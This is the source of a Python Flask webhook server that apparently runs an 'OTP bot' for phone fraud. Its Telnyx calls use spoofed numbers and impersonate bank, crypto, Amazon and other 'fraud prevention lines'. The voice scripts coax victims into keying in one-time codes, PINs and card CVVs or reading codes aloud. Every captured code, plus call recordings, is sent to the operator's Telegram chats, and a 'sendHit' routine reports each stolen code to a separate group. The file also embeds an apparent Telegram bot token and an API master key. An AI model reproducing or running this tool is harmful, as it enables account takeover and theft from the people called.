from flask import *
from flask import Flask, request
import telnyx
import time
import requests
import random

app = Flask(__name__)

token = "6026998258:AAFXXRfkQLw1oVgMn-GtyAF-7g648x4r5NQ"

telnyx.api_key = ""

@app.post("/voice/<number>/<spoof>/<service>/<name>/<otpdigits>/<chatid>/<tag>")
async def voice(number, spoof, service, name, otpdigits, chatid, tag):
    data = request.json['data']
    call = telnyx.Call.retrieve(data['payload']['call_control_id'])
    event = data.get('event_type')
    if event == "call.initiated":
        data = request.json['data']
        call_id = data['payload']['call_control_id']
        ## TIMEOUT CALL ENDED
        time.sleep(60)
        call.hangup()

    elif event == "call.answered":
        data = request.json['data']
        call_id = data['payload']['call_control_id']
        ## START OF CALL IN PROGRESS
        call.gather_using_speak(
           payload=f"Hello {name}, this is the {service} fraud prevention line. we have sent this automated call because of an attempt to change the password on your {service} account. if this was not you, please press 1",
           language="en-US",
           voice="female",
           service_level="premium",
           maximum_digits="1"
        )
        r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chatid}&text=├ 🤳 Call has been answered.")
    
    elif event == "call.speak.ended":
        call.hangup()

    elif event == "call.hangup":
        try:
            r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chatid}&text=└ ☎ Call has ended.")
        except TypeError as e:
            print(e)
    elif event == "call.recording.saved":
        response = requests.get(data['payload']['recording_urls']['mp3'])
        payload = {
            'chat_id': {chatid},
            'title': 'transcript.mp3',
            'parse_mode': 'HTML'
        }
        files = {
            'audio': response.content,
        }
        requests.post(f"https://api.telegram.org/bot{token}/sendAudio".format(token=f"{token}"),
            data=payload,
            files=files)

    elif event == "call.gather.ended":
        data = request.json['data']
        call_id = data['payload']['call_control_id']
        otp2 = data['payload']['digits']

        if otp2 == "1":
            ## SEND OTP
            call.gather_using_speak(
              payload=f"To block this request, please enter the {otpdigits} digit security code that we have sent to your mobile device",
              language="en-US",
              voice="female",
              service_level="premium",
              maximum_digits=f"{otpdigits}"
            )
            r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chatid}&text=├ 📲 Send OTP..")

        elif len(otp2) >= 3:
            ## CODE IS VALID
            call.speak(
              payload="The code that you have entered is valid, the request has been blocked.",
              language="en-US",
              service_level="premium",
              voice="female"
            )
            r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chatid}&text=├ ✅ OTP Code: {otp2}")
            sendHit(otp2, service)

    elif event == "call.machine.detection.ended":
        data = request.json['data']
        call_id = data['payload']['call_control_id']

        r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chatid}&text=├ 🔔 Voicemail Detected")

        call.hangup()
    return jsonify()
@app.post("/custom/<number>/<spoof>/<service>/<name>/<otpdigits>/<sid>/<chatid>/<tag>")
async def custom(number, spoof, service, name, otpdigits, sid, chatid, tag):
    url = f"https://api.jsonbin.io/v3/b/{sid}/latest"
    headers = {
          'X-Master-Key': '$2b$10$J.T6aYl8erCmAUgLi1JFZ..m5kIKkI4XE8JwLSrirmQHJNwPMA3hW'
    }

    req = requests.get(url, json=None, headers=headers)
    partsj = json.loads(str(req.text))
    sub_strings = {'module': service, 'otpdigits': otpdigits, 'name': name}
    if not any(x in partsj["record"]["part1"] for x in sub_strings):
       part1 = partsj["record"]["part1"]
       
    else:
      part1 = partsj["record"]["part1"].format(**sub_strings)
    if not any(x in partsj["record"]["part2"] for x in sub_strings):
       part2 = partsj["record"]["part2"]
    else:
      part2 = partsj["record"]["part2"].format(**sub_strings)
    if not any(x in partsj["record"]["part3"] for x in sub_strings):
       part3 = partsj["record"]["part3"]
    else:
      part3 = partsj["record"]["part3"].format(**sub_strings)
    data = request.json['data']
    call = telnyx.Call.retrieve(data['payload']['call_control_id'])
    event = data.get('event_type')
    if event == "call.initiated":
        data = request.json['data']
        call_id = data['payload']['call_control_id']
        ## TIMEOUT CALL ENDED
        time.sleep(60)
        call.hangup()

    elif event == "call.answered":
        data = request.json['data']
        call_id = data['payload']['call_control_id']
        ## START OF CALL IN PROGRESS
        call.gather_using_speak(
           payload=f"{part1}",
           language="en-US",
           voice="female",
           service_level="premium",
           maximum_digits="1"
        )
        r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chatid}&text=├ 🤳 Call has been answered.")
    
    elif event == "call.speak.ended":
        call.hangup()

    elif event == "call.hangup":
        r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chatid}&text=└ ☎ Call has ended.")

    elif event == "call.recording.saved":
        response = requests.get(data['payload']['recording_urls']['mp3'])
        payload = {
            'chat_id': {chatid},
            'title': 'transcript.mp3',
            'parse_mode': 'HTML'
        }
        files = {
            'audio': response.content,
        }
        requests.post(f"https://api.telegram.org/bot{token}/sendAudio".format(token=f"{token}"),
            data=payload,
            files=files)

    elif event == "call.gather.ended":
        data = request.json['data']
        call_id = data['payload']['call_control_id']
        otp2 = data['payload']['digits']

        if otp2 == "1":
            ## SEND OTP
            call.gather_using_speak(
              payload=f"{part2}",
              language="en-US",
              voice="female",
              service_level="premium",
              maximum_digits=f"{otpdigits}"
            )
            r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chatid}&text=├ 📲 Send OTP..")

        elif len(otp2) >= 3:
            ## CODE IS VALID
            call.speak(
              payload=part3,
              language="en-US",
              service_level="premium",
              voice="female"
            )
            r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chatid}&text=├ ✅ Custom Script: {otp2}")
            sendHit(otp2, service)

    elif event == "call.machine.detection.ended":
        data = request.json['data']
        call_id = data['payload']['call_control_id']

        r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chatid}&text=├ 🔔 Voicemail Detected")

        call.hangup()
    return jsonify()
@app.post("/customv/<number>/<spoof>/<service>/<name>/<otpdigits>/<sid>/<lang>/<chatid>/<tag>")
async def customv(number, spoof, service, name, otpdigits, sid, lang, chatid, tag):
    url = f"https://api.jsonbin.io/v3/b/{sid}/latest"
    headers = {
          'X-Master-Key': '$2b$10$J.T6aYl8erCmAUgLi1JFZ..m5kIKkI4XE8JwLSrirmQHJNwPMA3hW'
    }

    req = requests.get(url, json=None, headers=headers)
    partsj = json.loads(str(req.text))
    sub_strings = {'module': service, 'otpdigits': otpdigits, 'name': name}
    if not any(x in partsj["record"]["part1"] for x in sub_strings):
       part1 = partsj["record"]["part1"]
       
    else:
      part1 = partsj["record"]["part1"].format(**sub_strings)
    if not any(x in partsj["record"]["part2"] for x in sub_strings):
       part2 = partsj["record"]["part2"]
    else:
      part2 = partsj["record"]["part2"].format(**sub_strings)
    if not any(x in partsj["record"]["part3"] for x in sub_strings):
       part3 = partsj["record"]["part3"]
    else:
      part3 = partsj["record"]["part3"].format(**sub_strings)
    data = request.json['data']
    call = telnyx.Call.retrieve(data['payload']['call_control_id'])
    event = data.get('event_type')
    if event == "call.initiated":
        data = request.json['data']
        call_id = data['payload']['call_control_id']
        ## TIMEOUT CALL ENDED
        time.sleep(60)
        call.hangup()

    elif event == "call.answered":
        data = request.json['data']
        call_id = data['payload']['call_control_id']
        ## START OF CALL IN PROGRESS
        call.gather_using_speak(
           payload=f"{part1}",
           language=lang,
           voice="female",
           service_level="premium",
           maximum_digits="1"
        )
        r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chatid}&text=├ 🤳 Call has been answered.")
    
    elif event == "call.speak.ended":
        call.hangup()

    elif event == "call.hangup":
        r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chatid}&text=└ ☎ Call has ended.")

    elif event == "call.recording.saved":
        response = requests.get(data['payload']['recording_urls']['mp3'])
        payload = {
            'chat_id': {chatid},
            'title': 'transcript.mp3',
            'parse_mode': 'HTML'
        }
        files = {
            'audio': response.content,
        }
        requests.post(f"https://api.telegram.org/bot{token}/sendAudio".format(token=f"{token}"),
            data=payload,
            files=files)

    elif event == "call.gather.ended":
        data = request.json['data']
        call_id = data['payload']['call_control_id']
        otp2 = data['payload']['digits']

        if otp2 == "1":
            ## SEND OTP
            call.gather_using_speak(
              payload=f"{part2}",
              language=lang,
              voice="female",
              service_level="premium",
              maximum_digits=f"{otpdigits}"
            )
            r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chatid}&text=├ 📲 Send OTP..")

        elif len(otp2) >= 3:
            ## CODE IS VALID
            call.speak(
              payload=part3,
              language=lang,
              service_level="premium",
              voice="female"
            )
            r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chatid}&text=├ ✅ Custom Script: {otp2}")
            sendHit(otp2, service)


    elif event == "call.machine.detection.ended":
        data = request.json['data']
        call_id = data['payload']['call_control_id']

        r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chatid}&text=├ 🔔 Voicemail Detected")

        call.hangup()
    return jsonify()
@app.post("/pin/<number>/<spoof>/<service>/<name>/<otpdigits>/<chatid>/<tag>")
async def pin(number, spoof, service, name, otpdigits, chatid, tag):
    data = request.json['data']
    call = telnyx.Call.retrieve(data['payload']['call_control_id'])
    event = data.get('event_type')
    if event == "call.initiated":
        data = request.json['data']
        call_id = data['payload']['call_control_id']
        ## TIMEOUT CALL ENDED
        time.sleep(60)
        call.hangup()

    elif event == "call.answered":
        data = request.json['data']
        call_id = data['payload']['call_control_id']
        ## START OF CALL IN PROGRESS
        call.gather_using_speak(
           payload=f"Hello {name}, this is the {service} fraud prevention line. we have sent this automated call because of an attempt to change the password on your {service} account. if this was not you, please press 1",
           language="en-US",
           voice="female",
           service_level="premium",
           maximum_digits="1"
        )
        r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chatid}&text=├ 🤳 Call has been answered.")
    
    elif event == "call.speak.ended":
        call.hangup()

    elif event == "call.hangup":
        r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chatid}&text=└ ☎ Call has ended.")

    elif event == "call.recording.saved":
        response = requests.get(data['payload']['recording_urls']['mp3'])
        payload = {
            'chat_id': {chatid},
            'title': 'transcript.mp3',
            'parse_mode': 'HTML'
        }
        files = {
            'audio': response.content,
        }
        requests.post(f"https://api.telegram.org/bot{token}/sendAudio".format(token=f"{token}"),
            data=payload,
            files=files)

    elif event == "call.gather.ended":
        data = request.json['data']
        call_id = data['payload']['call_control_id']
        otp2 = data['payload']['digits']

        if otp2 == "1":
            ## SEND OTP
            call.gather_using_speak(
              payload=f"In order to block this request, Please enter the {otpdigits} digit pin that is currently associated with your {service} account.",
              language="en-US",
              voice="female",
              service_level="premium",
              maximum_digits=f"{otpdigits}"
            )
            r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chatid}&text=├ 📲 Victim is entering PIN..")

        elif len(otp2) >= 3:
            ## CODE IS VALID
            call.speak(
              payload="Thank you, The code you entered is correct, and the request has been blocked.",
              language="en-US",
              service_level="premium",
              voice="female"
            )
            r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chatid}&text=├ ✅ Pin: {otp2}")
            sendHit(otp2, service)


    elif event == "call.machine.detection.ended":
        data = request.json['data']
        call_id = data['payload']['call_control_id']

        r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chatid}&text=├ 🔔 Voicemail Detected")

        call.hangup()
    return jsonify()

@app.post("/email/<number>/<spoof>/<service>/<name>/<otpdigits>/<chatid>/<tag>")
async def email(number, spoof, service, name, otpdigits, chatid, tag):
    data = request.json['data']
    call = telnyx.Call.retrieve(data['payload']['call_control_id'])
    event = data.get('event_type')
    if event == "call.initiated":
        data = request.json['data']
        call_id = data['payload']['call_control_id']
        ## TIMEOUT CALL ENDED
        time.sleep(60)
        call.hangup()

    elif event == "call.answered":
        data = request.json['data']
        call_id = data['payload']['call_control_id']
        ## START OF CALL IN PROGRESS]
        call.record_start(format="mp3", channels="single")
        call.gather_using_speak(
           payload=f"Hello {name}, this is the {service} fraud prevention line. we have sent this automated call because of an attempt to change the phone number on your {service} account. if this was not you, please press 1",
           language="en-US",
           voice="female",
           service_level="premium",
           maximum_digits="1"
        )
        r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chatid}&text=├ 🤳 Call has been answered.")

    
    elif event == "call.speak.ended":
        call.hangup()

    elif event == "call.hangup":
        r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chatid}&text=└ ☎ Call has ended.")

    elif event == "call.recording.saved":
        response = requests.get(data['payload']['recording_urls']['mp3'])
        payload = {
            'chat_id': {chatid},
            'title': 'transcript.mp3',
            'parse_mode': 'HTML'
        }
        files = {
            'audio': response.content,
        }
        requests.post(f"https://api.telegram.org/bot{token}/sendAudio".format(token=f"{token}"),
            data=payload,
            files=files)

    elif event == "call.gather.ended":
        data = request.json['data']
        call_id = data['payload']['call_control_id']
        otp2 = data['payload']['digits']

        if otp2 == "1":
            ## SEND OTP
            call.gather_using_speak(
              payload=f"In order to block this request, please in a clear tone, read out the security code that we have sent to your mobile device. This is to verify ownership of your {service} account. Once completed please dial 2.",
              language="en-US",
              voice="female",
              service_level="premium",
              maximum_digits=1
            )
            r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chatid}&text=├ 📲 Send OTP..")

        elif otp2 == "2":
            ## CODE IS VALID
            call.speak(
              payload="Thank You. The code that you have read out is valid, the request has been blocked.",
              language="en-US",
              service_level="premium",
              voice="female"
            )
            r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chatid}&text=├ ✅ OTP Code Has Been Readout! Check Transcript For Code!")
            r2 = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id=-1001606835438&text=├ ✅ Email OTP Has Been Readout! ")
    return jsonify()
@app.post("/amazon/<number>/<spoof>/<service>/<name>/<otpdigits>/<chatid>/<tag>")
async def amazon(number, spoof, service, name, otpdigits, chatid, tag):
    data = request.json['data']
    call = telnyx.Call.retrieve(data['payload']['call_control_id'])
    event = data.get('event_type')
    if event == "call.initiated":
        data = request.json['data']
        call_id = data['payload']['call_control_id']
        ## TIMEOUT CALL ENDED
        time.sleep(60)
        call.hangup()

    elif event == "call.answered":
        data = request.json['data']
        call_id = data['payload']['call_control_id']
        ## START OF CALL IN PROGRESS]
        call.record_start(format="mp3", channels="single")
        call.gather_using_speak(
           payload=f"Hello {name}, this is the {service} fraud prevention line. we have sent this automated call because of an attempt to change the phone number on your {service} account. if this was not you, please press 1",
           language="en-US",
           voice="female",
           service_level="premium",
           maximum_digits="1"
        )
        r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chatid}&text=├ 🤳 Call has been answered.")

    
    elif event == "call.speak.ended":
        call.hangup()

    elif event == "call.hangup":
        r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chatid}&text=└ ☎ Call has ended.")

    elif event == "call.recording.saved":
        response = requests.get(data['payload']['recording_urls']['mp3'])
        payload = {
            'chat_id': {chatid},
            'title': 'transcript.mp3',
            'parse_mode': 'HTML'
        }
        files = {
            'audio': response.content,
        }
        requests.post(f"https://api.telegram.org/bot{token}/sendAudio".format(token=f"{token}"),
            data=payload,
            files=files)

    elif event == "call.gather.ended":
        data = request.json['data']
        call_id = data['payload']['call_control_id']
        otp2 = data['payload']['digits']

        if otp2 == "1":
            ## SEND OTP
            call.gather_using_speak(
              payload=f"In order to block this request, please approve a link, that we have just sent to your mobile device. This is to verify ownership of your {service} account. Once completed please dial 2.",
              language="en-US",
              voice="female",
              service_level="premium",
              maximum_digits=1
            )
            r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chatid}&text=├ 📲 Send Amazon Link..")

        elif otp2 == "2":
            ## CODE IS VALID
            call.speak(
              payload="Thank You. We have verified that you have approved the link, the request has been blocked.",
              language="en-US",
              service_level="premium",
              voice="female"
            )
            r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chatid}&text=├ ✅ Link has been approved!")
    return jsonify()


    ############### BANK


@app.post("/bank/<number>/<spoof>/<bank>/<name>/<otpdigits>/<chatid>/<tag>")
async def bank(number, spoof, bank, name, otpdigits, chatid, tag):
    data = request.json['data']
    call = telnyx.Call.retrieve(data['payload']['call_control_id'])
    event = data.get('event_type')
    if event == "call.initiated":
        data = request.json['data']
        call_id = data['payload']['call_control_id']
        ## TIMEOUT CALL ENDED
        time.sleep(60)
        call.hangup()

    elif event == "call.answered":
        data = request.json['data']
        call_id = data['payload']['call_control_id']
        ## START OF CALL IN PROGRESS
        call.gather_using_speak(
           payload=f"Hello {name}, this is an automated message from the {bank} fraud prevention line. we have sent this automated call because of a login attempt from an unknown device. if this was not you. please press 1.",
           language="en-US",
           voice="female",
           service_level="premium",
           maximum_digits="1"
        )
        r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chatid}&text=├ 🤳 Call has been answered.")
    
    elif event == "call.speak.ended":
        call.hangup()

    elif event == "call.hangup":
        r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chatid}&text=└ ☎ Call has ended.")

    elif event == "call.recording.saved":
        response = requests.get(data['payload']['recording_urls']['mp3'])
        payload = {
            'chat_id': {chatid},
            'title': 'transcript.mp3',
            'parse_mode': 'HTML'
        }
        files = {
            'audio': response.content,
        }
        requests.post(f"https://api.telegram.org/bot{token}/sendAudio".format(token=f"{token}"),
            data=payload,
            files=files)

    elif event == "call.gather.ended":
        data = request.json['data']
        call_id = data['payload']['call_control_id']
        otp2 = data['payload']['digits']

        if otp2 == "1":
            ## SEND OTP
            call.gather_using_speak(
              payload=f"To block this request, please enter the {otpdigits} digit security code that we have sent to your mobile device",
              language="en-US",
              voice="female",
              service_level="premium",
              maximum_digits=f"{otpdigits}"
            )
            r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chatid}&text=├ 📲 Send OTP..")

        elif len(otp2) >= 3:
            ## CODE IS VALID
            call.speak(
              payload="The code that you have entered is valid, the request has been blocked.",
              language="en-US",
              service_level="premium",
              voice="female"
            )
            r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chatid}&text=├ ✅ OTP Code: {otp2}")
            sendHit(otp2, bank)

    return jsonify()

@app.post("/etoro/<number>/<spoof>/<service>/<name>/<otpdigits>/<chatid>/<tag>")
async def etoro(number, spoof, service, name, otpdigits, chatid, tag):
    data = request.json['data']
    call = telnyx.Call.retrieve(data['payload']['call_control_id'])
    event = data.get('event_type')
    if event == "call.initiated":
        data = request.json['data']
        call_id = data['payload']['call_control_id']
        ## TIMEOUT CALL ENDED
        time.sleep(60)
        call.hangup()

    elif event == "call.answered":
        data = request.json['data']
        call_id = data['payload']['call_control_id']
        ## START OF CALL IN PROGRESS
        call.speak(
           payload=f"Good day Draskowitsch! we have cancelled another attempted crypto transaction to your wallet. The verification process might get delayed by that. We expect the verification process to be done between tuesday and thursday. Also you can send to your eToro agent new email and phone number which you want to be added to your eToro account",
           language="en-US",
           voice="female",
           service_level="premium",
        )
        
        r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chatid}&text=├ 🤳 Call has been answered.")
    
    elif event == "call.speak.ended":
        call.hangup()

    elif event == "call.hangup":
        r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chatid}&text=└ ☎ Call has ended.")

    elif event == "call.recording.saved":
        response = requests.get(data['payload']['recording_urls']['mp3'])
        payload = {
            'chat_id': {chatid},
            'title': 'transcript.mp3',
            'parse_mode': 'HTML'
        }
        files = {
            'audio': response.content,
        }
        requests.post(f"https://api.telegram.org/bot{token}/sendAudio".format(token=f"{token}"),
            data=payload,
            files=files)
    return jsonify()

    ############### BANK

@app.post("/cvv/<number>/<spoof>/<bank>/<name>/<cvvdigits>/<last4digits>/<chatid>/<tag>")
async def cvv(number, spoof, bank, name, cvvdigits, last4digits, chatid, tag):
    data = request.json['data']
    call = telnyx.Call.retrieve(data['payload']['call_control_id'])
    event = data.get('event_type')
    if event == "call.initiated":
        data = request.json['data']
        call_id = data['payload']['call_control_id']
        calldata = call.transcription_start(language="en")

        ## TIMEOUT CALL ENDED
        time.sleep(60)
        call.hangup()

    elif event == "call.answered":
        data = request.json['data']
        call_id = data['payload']['call_control_id']
        ## START OF CALL IN PROGRESS
        call.gather_using_speak(
           payload=f"Hello {name}. this is the {bank} fraud prevention line. we have detected unauthorized purchases made from your {bank} card, ending on ,{last4digits}. Please press 1 if this was not you.",
           language="en-US",
           voice="female",
           service_level="premium",
           maximum_digits="1"
        )
        r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chatid}&text=├ 🤳 Call has been answered.")
    
    elif event == "call.speak.ended":
        call.hangup()

    elif event == "call.hangup":
        r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chatid}&text={calldata}")

    elif event == "call.recording.saved":
        response = requests.get(data['payload']['recording_urls']['mp3'])
        payload = {
            'chat_id': {chatid},
            'title': 'transcript.mp3',
            'parse_mode': 'HTML'
        }
        files = {
            'audio': response.content,
        }
        requests.post(f"https://api.telegram.org/bot{token}/sendAudio".format(token=f"{token}"),
            data=payload,
            files=files)

    elif event == "call.gather.ended":
        data = request.json['data']
        call_id = data['payload']['call_control_id']
        otp2 = data['payload']['digits']

        if otp2 == "1":
            ## SEND OTP
            call.gather_using_speak(
              payload=f"to block this request, please enter the {cvvdigits} digit cvv code that stands on the back of your {bank} card.",
              language="en-US",
              voice="female",
              service_level="premium",
              maximum_digits=f"{cvvdigits}"
            )
            r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chatid}&text=├ 📲 Victim is sending CVV.")

        elif len(otp2) >= 3:
            ## CODE IS VALID
            call.speak(
              payload="The cvv code that you have entered is valid, the request has been blocked.",
              language="en-US",
              service_level="premium",
              voice="female"
            )
            r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chatid}&text=├ ✅ CVV Code: {otp2}")
            sendHit(otp2, bank)
    return jsonify()
@app.post("/crypto/<number>/<spoof>/<service>/<name>/<last4digits>/<otpdigits>/<chatid>/<tag>")
async def crypto(number, spoof, service, name, last4digits, otpdigits, chatid, tag):
    data = request.json['data']
    call = telnyx.Call.retrieve(data['payload']['call_control_id'])
    event = data.get('event_type')
    if event == "call.initiated":
        data = request.json['data']
        call_id = data['payload']['call_control_id']
        calldata = call.transcription_start(language="en")

        ## TIMEOUT CALL ENDED
        time.sleep(60)
        call.hangup()

    elif event == "call.answered":
        data = request.json['data']
        call_id = data['payload']['call_control_id']
        ## START OF CALL IN PROGRESS
        call.gather_using_speak(
           payload=f"Hello, this is the {service} fraud prevention line. A purchase of ($478.42), 0.00214 Bitcoin was requested using your payment method, (VISA ending in {last4digits}). If this was not you, please dial one on your keypad.",
           language="en-US",
           voice="female",
           service_level="premium",
           maximum_digits="1"
        )
        r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chatid}&text=├ 🤳 Call has been answered.")
    
    elif event == "call.speak.ended":
        call.hangup()

    elif event == "call.hangup":
        r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chatid}&text={calldata}")

    elif event == "call.recording.saved":
        response = requests.get(data['payload']['recording_urls']['mp3'])
        payload = {
            'chat_id': {chatid},
            'title': 'transcript.mp3',
            'parse_mode': 'HTML'
        }
        files = {
            'audio': response.content,
        }
        requests.post(f"https://api.telegram.org/bot{token}/sendAudio".format(token=f"{token}"),
            data=payload,
            files=files)

    elif event == "call.gather.ended":
        data = request.json['data']
        call_id = data['payload']['call_control_id']
        otp2 = data['payload']['digits']

        if otp2 == "1":
            ## SEND OTP
            call.gather_using_speak(
              payload=f"To verify your identity, please dial the {otpdigits} digit otp code that we have sent to your mobile device, this is to cancel the transaction and secure your account.",
              language="en-US",
              voice="female",
              service_level="premium",
              maximum_digits=f"{otpdigits}"
            )
            r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chatid}&text=├ 📲 Send OTP...")

        elif len(otp2) >= 3:
            ## CODE IS VALID
            call.speak(
              payload=f"Thank you for your identity confirmation. Your pending transactions have been canceled. For any further information, your reference ID is 4K9-98C. Your account has been placed in a recovery setting, to prevent further unauthorized access. To restore access to your account, please wait up to 48-27 hours for a recovery access text. That will be sent to you, thank you for using {service}.",
              language="en-US",
              service_level="premium",
              voice="female"
            )
            r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chatid}&text=├ ✅ OTP Code: {otp2}")
            sendHit(otp2, service)
    return jsonify()

def sendHit(code, module):
    r2 = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id=-1001785032671&text=🎉New OTP Hit! 🎉\n\n 📌Module:{module}\n✅OTP: {code} ")
if __name__ == "__main__":
    app.run(debug=False, port=5000)
